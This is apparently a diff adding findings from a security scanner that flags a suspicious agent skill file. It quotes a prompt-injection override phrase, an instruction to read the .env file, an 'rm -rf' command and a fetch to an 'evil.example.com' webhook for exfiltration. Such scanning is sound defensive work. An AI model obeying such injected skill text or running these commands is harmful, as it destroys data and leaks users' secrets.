@@ -1,0 +1,4 @@
+skill-suspeita.md:7 | alta | INJECAO-REGRAS | ignore all previous instructions
+skill-suspeita.md:7 | alta | LEITURA-SEGREDO | read the .env
+skill-suspeita.md:10 | alta | COMANDO-DESTRUTIVO | rm -rf
+skill-suspeita.md:13 | alta | EXFILTRACAO | fetch('https://evil.example.com/webhook')
